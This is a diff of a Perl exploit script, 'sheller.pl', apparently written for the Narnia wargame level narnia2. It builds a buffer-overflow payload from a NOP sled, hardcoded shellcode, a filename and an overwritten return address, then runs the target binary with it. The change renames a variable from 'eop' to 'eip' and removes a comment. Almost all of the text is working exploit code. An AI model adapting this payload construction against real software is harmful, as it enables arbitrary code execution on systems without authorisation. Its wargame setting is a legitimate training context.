@@ -16,21 +16,19 @@ my @shellcode = ("\x31", "\xc0", "\x31", "\xdb", "\x31", "\xc9",
 		 "\xe8", "\xc9", "\xff", "\xff", "\xff");
 
 unless( $ARGV[0] && $ARGV[1] && $ARGV[2]) {
-    print "Usage: ./sheller.pl [filename] [buffersize] [eop]\n";
+    print "Usage: ./sheller.pl [filename] [buffersize] [eip]\n";
     exit
 }
 
 my $filename =  $ARGV[0];
 my $buffersize = $ARGV[1];
-my $eop = $ARGV[2];
-
-# TRYING SO HARD xD
+my $eip = $ARGV[2];
 
 my $shelllength = scalar @shellcode + length $filename;
 my $nopsize = $buffersize - $shelllength;
 my $leftnop = $nopsize - 20;
 my $rightnop = $nopsize - $leftnop;
-my $exploit = "\x90" x $leftnop . join("", @shellcode) . $filename . "\x90" x $rightnop . $eop;
+my $exploit = "\x90" x $leftnop . join("", @shellcode) . $filename . "\x90" x $rightnop . $eip;
 my $out = `./narnia2 $exploit`;
 print $out;
 
